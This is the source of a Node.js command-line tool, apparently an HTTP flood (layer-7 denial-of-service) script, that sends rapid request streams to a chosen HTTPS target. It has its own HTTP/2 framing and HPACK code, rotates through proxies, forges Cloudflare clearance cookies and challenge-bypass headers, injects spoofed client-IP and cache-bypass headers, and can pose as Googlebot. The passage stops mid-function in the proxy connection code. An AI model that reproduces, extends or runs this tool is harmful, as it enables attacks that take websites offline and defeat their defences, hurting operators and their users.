const net = require('net');
const tls = require('tls');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const chalk = require('chalk');

process.env.UV_THREADPOOL_SIZE = os.cpus().length;

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });

// ==================== HPACK IMPLEMENTATION ====================
class HPACK {
    constructor() {
        this.dynamicTable = [];
        this.dynamicTableSize = 0;
        this.maxDynamicTableSize = 4096;
        this.staticTable = this.createStaticTable();
    }

    createStaticTable() {
        return [
            [':authority', ''],
            [':method', 'GET'],
            [':method', 'POST'],
            [':path', '/'],
            [':path', '/index.html'],
            [':scheme', 'http'],
            [':scheme', 'https'],
            [':status', '200'],
            [':status', '204'],
            [':status', '206'],
            [':status', '304'],
            [':status', '400'],
            [':status', '404'],
            [':status', '500'],
            ['accept-charset', ''],
            ['accept-encoding', 'gzip, deflate'],
            ['accept-language', ''],
            ['accept-ranges', ''],
            ['accept', ''],
            ['access-control-allow-origin', ''],
            ['age', ''],
            ['allow', ''],
            ['authorization', ''],
            ['cache-control', ''],
            ['content-disposition', ''],
            ['content-encoding', ''],
            ['content-language', ''],
            ['content-length', ''],
            ['content-location', ''],
            ['content-range', ''],
            ['content-type', ''],
            ['cookie', ''],
            ['date', ''],
            ['etag', ''],
            ['expect', ''],
            ['expires', ''],
            ['from', ''],
            ['host', ''],
            ['if-match', ''],
            ['if-modified-since', ''],
            ['if-none-match', ''],
            ['if-range', ''],
            ['if-unmodified-since', ''],
            ['last-modified', ''],
            ['link', ''],
            ['location', ''],
            ['max-forwards', ''],
            ['proxy-authenticate', ''],
            ['proxy-authorization', ''],
            ['range', ''],
            ['referer', ''],
            ['refresh', ''],
            ['retry-after', ''],
            ['server', ''],
            ['set-cookie', ''],
            ['strict-transport-security', ''],
            ['transfer-encoding', ''],
            ['user-agent', ''],
            ['vary', ''],
            ['via', ''],
            ['www-authenticate', '']
        ];
    }

    encode(headers) {
        let encoded = Buffer.alloc(0);
        
        for (const [name, value] of headers) {
            const idx = this.findIndex(name, value);
            
            if (idx > 0) {
                // Indexed representation
                encoded = Buffer.concat([encoded, this.encodeInteger(idx, 7, 0x80)]);
            } else {
                const nameIdx = this.findNameIndex(name);
                if (nameIdx > 0) {
                    // Literal with indexed name
                    const prefix = nameIdx <= 14 ? 0 : 4;
                    const firstByte = (prefix << 4) | 0x0C;
                    encoded = Buffer.concat([
                        encoded,
                        Buffer.from([firstByte]),
                        this.encodeInteger(nameIdx, 4, 0),
                        this.encodeString(value)
                    ]);
                } else {
                    // Literal with new name
                    encoded = Buffer.concat([
                        encoded,
                        Buffer.from([0x40]),
                        this.encodeString(name),
                        this.encodeString(value)
                    ]);
                }
                
                // Add to dynamic table
                this.addToDynamicTable(name, value);
            }
        }
        
        return encoded;
    }

    decode(data) {
        const headers = [];
        let offset = 0;
        
        while (offset < data.length) {
            const firstByte = data[offset];
            
            if (firstByte & 0x80) {
                // Indexed representation
                const [idx, bytesRead] = this.decodeInteger(data, offset, 7);
                offset += bytesRead;
                
                const header = this.getHeader(idx);
                if (header) {
                    headers.push([header[0], header[1]]);
                }
            } else if ((firstByte & 0xC0) === 0x40) {
                // Literal with incremental indexing
                offset += 1;
                const [name, nameBytes] = this.decodeString(data, offset);
                offset += nameBytes;
                const [value, valueBytes] = this.decodeString(data, offset);
                offset += valueBytes;
                
                headers.push([name, value]);
                this.addToDynamicTable(name, value);
            } else if ((firstByte & 0xF0) === 0x00) {
                // Literal without indexing
                const [nameIdx, idxBytes] = this.decodeInteger(data, offset, 4);
                offset += idxBytes;
                
                let name;
                if (nameIdx > 0) {
                    const header = this.getHeader(nameIdx);
                    name = header[0];
                } else {
                    const [decodedName, nameBytes] = this.decodeString(data, offset);
                    offset += nameBytes;
                    name = decodedName;
                }
                
                const [value, valueBytes] = this.decodeString(data, offset);
                offset += valueBytes;
                
                headers.push([name, value]);
            } else {
                // Literal never indexed
                offset += 1;
                const [nameIdx, idxBytes] = this.decodeInteger(data, offset, 4);
                offset += idxBytes;
                
                let name;
                if (nameIdx > 0) {
                    const header = this.getHeader(nameIdx);
                    name = header[0];
                } else {
                    const [decodedName, nameBytes] = this.decodeString(data, offset);
                    offset += nameBytes;
                    name = decodedName;
                }
                
                const [value, valueBytes] = this.decodeString(data, offset);
                offset += valueBytes;
                
                headers.push([name, value]);
            }
        }
        
        return headers;
    }

    findIndex(name, value) {
        // Check static table
        for (let i = 0; i < this.staticTable.length; i++) {
            if (this.staticTable[i][0] === name && this.staticTable[i][1] === value) {
                return i + 1;
            }
        }
        
        // Check dynamic table
        for (let i = 0; i < this.dynamicTable.length; i++) {
            if (this.dynamicTable[i][0] === name && this.dynamicTable[i][1] === value) {
                return this.staticTable.length + i + 1;
            }
        }
        
        return -1;
    }

    findNameIndex(name) {
        // Check static table
        for (let i = 0; i < this.staticTable.length; i++) {
            if (this.staticTable[i][0] === name) {
                return i + 1;
            }
        }
        
        // Check dynamic table
        for (let i = 0; i < this.dynamicTable.length; i++) {
            if (this.dynamicTable[i][0] === name) {
                return this.staticTable.length + i + 1;
            }
        }
        
        return -1;
    }

    getHeader(index) {
        if (index <= 0) return null;
        
        if (index <= this.staticTable.length) {
            return this.staticTable[index - 1];
        }
        
        const dynamicIndex = index - this.staticTable.length - 1;
        if (dynamicIndex < this.dynamicTable.length) {
            return this.dynamicTable[dynamicIndex];
        }
        
        return null;
    }

    addToDynamicTable(name, value) {
        const entrySize = name.length + value.length + 32;
        
        // Evict entries if necessary
        while (this.dynamicTableSize + entrySize > this.maxDynamicTableSize && this.dynamicTable.length > 0) {
            const removed = this.dynamicTable.pop();
            this.dynamicTableSize -= (removed[0].length + removed[1].length + 32);
        }
        
        if (entrySize <= this.maxDynamicTableSize) {
            this.dynamicTable.unshift([name, value]);
            this.dynamicTableSize += entrySize;
        }
    }

    setTableSize(size) {
        this.maxDynamicTableSize = size;
        
        // Evict entries if new size is smaller
        while (this.dynamicTableSize > size && this.dynamicTable.length > 0) {
            const removed = this.dynamicTable.pop();
            this.dynamicTableSize -= (removed[0].length + removed[1].length + 32);
        }
    }

    encodeInteger(value, prefixBits, prefix) {
        const maxPrefix = (1 << prefixBits) - 1;
        
        if (value < maxPrefix) {
            return Buffer.from([prefix | value]);
        }
        
        const bytes = [];
        let remaining = value - maxPrefix;
        
        bytes.push(prefix | maxPrefix);
        
        while (remaining >= 128) {
            bytes.push((remaining % 128) + 128);
            remaining = Math.floor(remaining / 128);
        }
        
        bytes.push(remaining);
        
        return Buffer.from(bytes);
    }

    decodeInteger(data, offset, prefixBits) {
        const maxPrefix = (1 << prefixBits) - 1;
        const firstByte = data[offset];
        let value = firstByte & maxPrefix;
        
        if (value < maxPrefix) {
            return [value, 1];
        }
        
        let m = 0;
        let bytesRead = 1;
        let b;
        
        do {
            b = data[offset + bytesRead];
            value += (b & 127) << (m * 7);
            m++;
            bytesRead++;
        } while (b & 128);
        
        return [value, bytesRead];
    }

    encodeString(str) {
        const strBuf = Buffer.from(str, 'utf8');
        const lenBuf = this.encodeInteger(strBuf.length, 7, 0);
        return Buffer.concat([lenBuf, strBuf]);
    }

    decodeString(data, offset) {
        const [length, bytesRead] = this.decodeInteger(data, offset, 7);
        const str = data.toString('utf8', offset + bytesRead, offset + bytesRead + length);
        return [str, bytesRead + length];
    }
}
// ==================== END HPACK ====================

const statusesQ = [];
let statuses = {};
let rawConnections = 0;
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let STREAMID_RESET = 0;
let timer = 0;
const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";

const reqmethod = process.argv[2];
const target = process.argv[3];
const time = parseInt(process.argv[4]);
setTimeout(() => {
    process.exit(1);
}, time * 1000);

const threads = parseInt(process.argv[5]);
const ratelimit = parseInt(process.argv[6]);
const queryIndex = process.argv.indexOf('--randpath');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) / 2 : 0;
const connectFlag = process.argv.includes('--connect');
const forceHttpIndex = process.argv.indexOf('--http');
const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
const debugMode = process.argv.includes('--debug');
const cacheIndex = process.argv.indexOf('--cache');
const enableCache = cacheIndex !== -1;
const bfmFlagIndex = process.argv.indexOf('--bfm');
const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
const cookieIndex = process.argv.indexOf('--cookie');
const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
const refererIndex = process.argv.indexOf('--referer');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const postdataIndex = process.argv.indexOf('--postdata');
const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
const randrateIndex = process.argv.indexOf('--randrate');
const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;
const customHeadersIndex = process.argv.indexOf('--header');
const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;
const fakeBotIndex = process.argv.indexOf('--fakebot');
const fakeBot = fakeBotIndex !== -1 && fakeBotIndex + 1 < process.argv.length ? process.argv[fakeBotIndex + 1].toLowerCase() === 'true' : false;
const authIndex = process.argv.indexOf('--authorization');
const authValue = authIndex !== -1 && authIndex + 1 < process.argv.length ? process.argv[authIndex + 1] : undefined;
const proxyIndex = process.argv.indexOf('--proxy');
const proxyFile = proxyIndex !== -1 && proxyIndex + 1 < process.argv.length ? process.argv[proxyIndex + 1] : undefined;

let proxies = [];
if (proxyFile && fs.existsSync(proxyFile)) {
    try {
        const content = fs.readFileSync(proxyFile, 'utf8');
        proxies = content.split('\n')
            .map(line => line.trim())
            .filter(line => line && !line.startsWith('#'))
            .map(line => {
                const parts = line.split(':');
                if (parts.length === 2) {
                    return { host: parts[0], port: parseInt(parts[1]), auth: null };
                } else if (parts.length === 4) {
                    return { host: parts[0], port: parseInt(parts[1]), auth: { username: parts[2], password: parts[3] } };
                }
                return null;
            })
            .filter(p => p !== null);
    } catch (e) {}
}

if (!reqmethod || !target || !time || !threads || !ratelimit) {
    console.clear();
    console.log(`node raw.js <GET> <target> <time> <thread> <rate>
--debug - enable debug mode
--full - full attack mode
--proxy <file> - proxy list file (format: ip:port or ip:port:user:pass)
--randpath <1|2|3> - random path mode
--delay <ms> - delay between requests
--cache - enable cache bypass
--referer <url|rand> - set referer
--authorization <type:value> - set authorization
--header "Header1: value1#Header2: value2" - custom headers
--fakebot true/false - fake bot user agent
--bfm true/false - bypass cloudflare
--cookie <value> - set cookie
--postdata <data> - post data
--randrate - random rate
--connect - connect mode
--http <1|2|mix> - force http version
    `);
    process.exit(1);
}

if (!target.startsWith('https://')) {
    console.error('Protocol only supports https://');
    process.exit(1);
}

function getRandomChar() {
    const alphabet = 'abcdefghijklmnopqrstuvwxyz';
    const randomIndex = Math.floor(Math.random() * alphabet.length);
    return alphabet[randomIndex];
}

let randomPathSuffix = '';
setInterval(() => {
    randomPathSuffix = `${getRandomChar()}`;
}, 3333);

let hcookie = '';
let currentRefererValue = refererValue === 'rand' ? 'https://' + randstr(6) + ".net" : refererValue;

if (bfmFlag && bfmFlag.toLowerCase() === 'true') {
    hcookie = `__cf_bm=${randstr(23)}_${randstr(19)}-${timestampString}-1-${randstr(4)}/${randstr(65)}+${randstr(16)}=; cf_clearance=${randstr(35)}_${randstr(7)}-${timestampString}-0-1-${randstr(8)}.${randstr(8)}.${randstr(8)}-0.2.${timestampString}`;
}

if (cookieValue) {
    if (cookieValue === '%RAND%') {
        hcookie = hcookie ? `${hcookie}; ${randstr(6)}=${randstr(6)}` : `${randstr(6)}=${randstr(6)}`;
    } else {
        hcookie = hcookie ? `${hcookie}; ${cookieValue}` : cookieValue;
    }
}

const url = new URL(target);

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    const length = payload.length;
    frame.writeUInt32BE((length << 8) | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (length > 0)
        frame = Buffer.concat([frame, payload]);
    return frame;
}

function decodeFrame(data) {
    try {
        if (data.length < 9) return null;
        
        const lengthAndType = data.readUInt32BE(0);
        const length = lengthAndType >> 8;
        const type = lengthAndType & 0xFF;
        const flags = data.readUInt8(4);
        const streamId = data.readUInt32BE(5);
        
        if (data.length < 9 + length) return null;
        
        let payload = Buffer.alloc(0);
        if (length > 0) {
            payload = data.subarray(9, 9 + length);
        }
        
        return {
            streamId,
            length,
            type,
            flags,
            payload
        };
    } catch (e) {
        return null;
    }
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

function encodeRstStream(streamId, errorCode = 0) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(3, 4);
    frameHeader.writeUInt32BE(streamId, 5);
    const payload = Buffer.alloc(4);
    payload.writeUInt32BE(errorCode, 0);
    return Buffer.concat([frameHeader, payload]);
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

if (url.pathname.includes("%RAND%")) {
    const randomValue = randstr(6) + "&" + randstr(6);
    url.pathname = url.pathname.replace("%RAND%", randomValue);
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function shuffle(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

const legitIP = generateLegitIP();

function generateLegitIP() {
    const asnData = [
      { asn: "AS15169", country: "US", ip: "8.8.8." },
      { asn: "AS16509", country: "US", ip: "3.120.0." },
      { asn: "AS8075", country: "US", ip: "13.107.21." },
      { asn: "AS13335", country: "US", ip: "104.16.0." },
      { asn: "AS54113", country: "US", ip: "104.244.42." },
      { asn: "AS32934", country: "US", ip: "157.240.0." },
      { asn: "AS5410", country: "US", ip: "23.235.33." },
      { asn: "AS1653", country: "US", ip: "152.199.19." },
      { asn: "AS7018", country: "US", ip: "96.44.0." },
      { asn: "AS3356", country: "US", ip: "80.239.60." },
      { asn: "AS701", country: "US", ip: "208.80.0." },
      { asn: "AS26347", country: "CA", ip: "64.68.0." },
      { asn: "AS577", country: "CA", ip: "64.71.0." },
      { asn: "AS28573", country: "NG", ip: "154.113.0." },
      { asn: "AS24961", country: "BR", ip: "2804.14.0." },
      { asn: "AS28573", country: "BR", ip: "45.5.0." },
      { asn: "AS20001", country: "AR", ip: "181.49.0." },
      { asn: "AS28573", country: "MX", ip: "189.225.0." },
      { asn: "AS24940", country: "DE", ip: "141.105.64." },
      { asn: "AS16276", country: "FR", ip: "185.33.0." },
      { asn: "AS8452", country: "NL", ip: "31.13.64." },
      { asn: "AS6805", country: "GB", ip: "51.140.0." },
      { asn: "AS32934", country: "IE", ip: "157.240.2." },
      { asn: "AS9009", country: "CH", ip: "84.211.0." },
      { asn: "AS680", country: "SE", ip: "194.225.0." },
      { asn: "AS3301", country: "RU", ip: "5.8.0." },
      { asn: "AS36992", country: "ZA", ip: "41.0.0." },
      { asn: "AS37100", country: "KE", ip: "102.65.0." },
      { asn: "AS36948", country: "NG", ip: "105.112.0." },
      { asn: "AS36928", country: "EG", ip: "197.248.0." },
      { asn: "AS29049", country: "IL", ip: "23.222.0." },
      { asn: "AS42204", country: "SA", ip: "2.224.0." },
      { asn: "AS47966", country: "AE", ip: "94.200.0." },
      { asn: "AS7643", country: "VN", ip: "123.30.134." },
      { asn: "AS18403", country: "VN", ip: "14.160.0." },
      { asn: "AS24086", country: "VN", ip: "42.112.0." },
      { asn: "AS38733", country: "VN", ip: "103.2.224." },
      { asn: "AS45543", country: "VN", ip: "113.22.0." },
      { asn: "AS7602", country: "VN", ip: "27.68.128." },
      { asn: "AS131127", country: "VN", ip: "103.17.88." },
      { asn: "AS140741", country: "VN", ip: "103.167.198." },
      { asn: "AS983", country: "AU", ip: "1.1.1." },
      { asn: "AS7552", country: "AU", ip: "49.255.0." },
      { asn: "AS9829", country: "IN", ip: "103.21.244." },
      { asn: "AS55836", country: "IN", ip: "103.64.0." },
      { asn: "AS4837", country: "CN", ip: "218.104.0." },
      { asn: "AS9808", country: "HK", ip: "203.81.0." },
      { asn: "AS4528", country: "TW", ip: "61.220.0." },
      { asn: "AS13238", country: "KR", ip: "13.124.0." },
      { asn: "AS18101", country: "TH", ip: "103.5.0." },
      { asn: "AS7545", country: "MY", ip: "103.5.0." },
      { asn: "AS10048", country: "PH", ip: "202.57.32." },
      { asn: "AS4808", country: "JP", ip: "153.127.0." },
      { asn: "AS40027", country: "US", ip: "198.41.128." },
      { asn: "AS396982", country: "NL", ip: "45.79.0." }
    ];
    const data = asnData[Math.floor(Math.random() * asnData.length)];
    return `${data.ip}${Math.floor(Math.random() * 255)}`;
}

function generateAlternativeIPHeaders() {
    const headers = {};
    if (Math.random() < 0.5) headers["cdn-loop"] = `${generateLegitIP()}:${randstr(5)}`;
    if (Math.random() < 0.4) headers["true-client-ip"] = generateLegitIP();
    if (Math.random() < 0.5) headers["via"] = `1.1 ${generateLegitIP()}`;
    if (Math.random() < 0.6) headers["request-context"] = `appId=${randstr(8)};ip=${generateLegitIP()}`;
    if (Math.random() < 0.4) headers["x-edge-ip"] = generateLegitIP();
    if (Math.random() < 0.3) headers["x-coming-from"] = generateLegitIP();
    if (Math.random() < 0.4) headers["akamai-client-ip"] = generateLegitIP();
    if (Object.keys(headers).length === 0) {
        headers["cdn-loop"] = `${generateLegitIP()}:${randstr(5)}`;
    }
    return headers;
}

function generateDynamicHeaders() {
    const chromeVersion = getRandomInt(119, 131);
    const secChUaFullVersion = `${chromeVersion}.0.${getRandomInt(5000, 6500)}.${getRandomInt(50, 150)}`;
    const platforms = ['Windows', 'macOS', 'Linux', 'Chrome OS'];
    const architectures = ['x86', 'x86_64', 'arm', 'arm64'];
    const platformVersions = {
        'Windows': () => ['10.0.0', '11.0.0'][Math.floor(Math.random() * 2)],
        'macOS': () => `${getRandomInt(12, 14)}.${getRandomInt(0, 6)}.${getRandomInt(0, 3)}`,
        'Linux': () => `${getRandomInt(5, 6)}.${getRandomInt(0, 19)}.0`,
        'Chrome OS': () => `${getRandomInt(14, 16)}.0.0`
    };
    
    const selectedPlatform = platforms[Math.floor(Math.random() * platforms.length)];
    const platformVersion = platformVersions[selectedPlatform]();
    
    const headerOrder = [
        'user-agent',
        'accept',
        'accept-language',
        'accept-encoding',
        'sec-ch-ua',
        'sec-ch-ua-mobile',
        'sec-ch-ua-platform',
        'sec-ch-ua-platform-version',
        'sec-ch-ua-arch',
        'sec-ch-ua-bitness',
        'sec-ch-ua-model',
        'sec-ch-ua-full-version-list',
        'sec-fetch-site',
        'sec-fetch-mode',
        'sec-fetch-dest',
        'sec-fetch-user',
        'upgrade-insecure-requests',
        'referer',
        'dnt'
    ];
    
    const userAgent = fakeBot ? 
        `Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)` :
        `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVersion}.0.0.0 Safari/537.36`;
    
    const isMobile = false;
    
    const dynamicHeaders = {
        'user-agent': userAgent,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': `en-US,en;q=0.9`,
        'accept-encoding': 'gzip, deflate, br',
        'sec-ch-ua': `"Chromium";v="${chromeVersion}", "Google Chrome";v="${chromeVersion}", "Not=A?Brand";v="99"`,
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': `"${selectedPlatform}"`,
        'sec-ch-ua-platform-version': `"${platformVersion}"`,
        'sec-ch-ua-arch': `"${architectures[Math.floor(Math.random() * architectures.length)]}"`,
        'sec-ch-ua-bitness': Math.random() > 0.3 ? '"64"' : '"32"',
        'sec-ch-ua-model': isMobile ? '"SM-G960F"' : '""',
        'sec-ch-ua-full-version-list': `"Chromium";v="${secChUaFullVersion}", "Google Chrome";v="${secChUaFullVersion}", "Not=A?Brand";v="99"`,
        'sec-fetch-site': 'none',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-dest': 'document',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'dnt': Math.random() > 0.7 ? '1' : undefined,
        'referer': currentRefererValue
    };
    
    const orderedHeaders = headerOrder
        .filter(key => dynamicHeaders[key] !== undefined)
        .map(key => [key, dynamicHeaders[key]]);
    
    return orderedHeaders;
}

function generateCfClearanceCookie() {
    const timestamp = Math.floor(Date.now() / 1000);
    const challengeId = crypto.randomBytes(8).toString('hex');
    const clientId = randstr(32);
    const version = getRandomInt(18100, 18350);
    
    return `cf_clearance=${clientId}.${challengeId}-${version}.${timestamp}.${randstr(32)}`;
}

function generateChallengeHeaders() {
    const challengeToken = randstr(64);
    const challengeResponse = crypto
        .createHash('sha256')
        .update(challengeToken + timestamp)
        .digest('hex');
    
    return [
        ['cf-chl-bypass', '1'],
        ['cf-chl-tk', challengeToken],
        ['cf-chl-response', challengeResponse.substring(0, 32)]
    ];
}

function generateAuthorizationHeader(authValue) {
    if (!authValue) return null;
    
    const [type, ...valueParts] = authValue.split(':');
    const value = valueParts.join(':');
    
    if (type.toLowerCase() === 'bearer') {
        if (value === '%RAND%') {
            return `Bearer ${randstr(64)}`;
        }
        return `Bearer ${value}`;
    } else if (type.toLowerCase() === 'basic') {
        const [username, password] = value.split(':');
        if (!username || !password) return null;
        const credentials = Buffer.from(`${username}:${password}`).toString('base64');
        return `Basic ${credentials}`;
    }
    
    return value;
}

function getRandomMethod() {
    const methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE'];
    return methods[Math.floor(Math.random() * methods.length)];
}

const cache_bypass = [
    {'cache-control': 'max-age=0'},
    {'pragma': 'no-cache'},
    {'expires': '0'},
    {'x-bypass-cache': 'true'},
    {'x-cache-bypass': '1'},
    {'x-no-cache': '1'},
    {'cache-tag': 'none'},
    {'clear-site-data': '"cache"'},
];

function generateJA3Fingerprint() {
    return {
        ciphers: [
            'TLS_AES_128_GCM_SHA256',
            'TLS_AES_256_GCM_SHA384',
            'TLS_CHACHA20_POLY1305_SHA256',
            'ECDHE-RSA-AES128-GCM-SHA256',
            'ECDHE-RSA-AES256-GCM-SHA384'
        ],
        curves: ['X25519', 'secp256r1', 'secp384r1'],
        extensions: ['1', '5', '10', '13', '16', '23', '27', '35', '43', '45', '51']
    };
}

function generateHTTP2Fingerprint() {
    return {
        HEADER_TABLE_SIZE: 4096,
        ENABLE_PUSH: 1,
        MAX_CONCURRENT_STREAMS: 100,
        INITIAL_WINDOW_SIZE: 65535,
        MAX_FRAME_SIZE: 16384,
        MAX_HEADER_LIST_SIZE: 32768,
        ENABLE_CONNECT_PROTOCOL: 1
    };
}

const ja3Fingerprint = generateJA3Fingerprint();
const http2Fingerprint = generateHTTP2Fingerprint();

function generateBrowserFingerprint() {
    const chromeVersion = getRandomInt(119, 131);
    
    const userAgent = fakeBot ? 
        `Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)` :
        `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVersion}.0.0.0 Safari/537.36`;
    
    return {
        screen: {
            width: 1920,
            height: 1080,
            availWidth: 1920,
            availHeight: 1080,
            colorDepth: 24,
            pixelDepth: 24
        },
        navigator: {
            language: 'en-US',
            languages: ['en-US', 'en'],
            doNotTrack: Math.random() > 0.7 ? "1" : "0",
            hardwareConcurrency: 8,
            userAgent: userAgent,
            deviceMemory: 8,
            maxTouchPoints: 0,
            webdriver: false,
            cookiesEnabled: true
        },
        webgl: {
            vendor: 'Google Inc. (AMD)',
            renderer: 'ANGLE (AMD, AMD Radeon RX 7900 XTX, Direct3D11 vs_5_0 ps_5_0)'
        },
        canvas: crypto.randomBytes(4).toString('hex'),
        ja3: crypto.randomBytes(16).toString('hex')
    };
}

const fingerprint = generateBrowserFingerprint();

function colorizeStatus(status, count) {
    const greenStatuses = ['200', '404'];
    const redStatuses = ['403', '429'];
    const yellowStatuses = ['503', '502', '522', '520', '521', '523', '524'];
    
    let coloredStatus;
    if (greenStatuses.includes(status)) {
        coloredStatus = chalk.green.bold(status);
    } else if (redStatuses.includes(status)) {
        coloredStatus = chalk.red.bold(status);
    } else if (yellowStatuses.includes(status)) {
        coloredStatus = chalk.yellow.bold(status);
    } else {
        coloredStatus = chalk.gray.bold(status);
    }
    
    const underlinedCount = chalk.underline(count);
    return `${coloredStatus}: ${underlinedCount}`;
}

function getRandomProxy() {
    if (proxies.length === 0) return null;
    return proxies[Math.floor(Math.random() * proxies.length)];
}

function go() {
    let tlsSocket;
    let hpack = new HPACK();
    
    let proxy = getRandomProxy();
    const useProxy = proxy !== null;
    
    const connectCallback = () => {
        rawConnections++;
        
        if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol === 'http/1.1') {
            // HTTP/1.1
            if (forceHttp == 2) {
                tlsSocket.destroy();
                return;
            }
            
            sendHttp1Request();
        } else {
            // HTTP/2
            if (forceHttp == 1) {
                tlsSocket.destroy();
                return;
            }
            
            setupHttp2();
        }
    };
    
    if (useProxy) {
        // Use proxy
        const proxySocket = net.connect({
            host: proxy.host,
            port: proxy.port,
            timeout: 10000
        });
        
        proxySocket.on('connect', () => {
            let connectRequest = `CONNECT ${url.hostname}:443 HTTP/1.1\r\n`;
            connectRequest += `Host: ${url.hostname}:443\r\n`;
            if (proxy.auth) {
                const auth = Buffer.from(`${proxy.auth.username}:${proxy.auth.password}`).toString('base64');
                connectRequest += `Proxy-Authorization: Basic ${auth}\r\n`;
            }
            connectRequest += `User-Agent: Mozilla/5.0\r\n`;
            connectRequest += `Proxy-Connection: Keep-Alive\r\n`;
            connectRequest += '\r\n';
            
            proxySocket.write(connectRequest);
        });
        
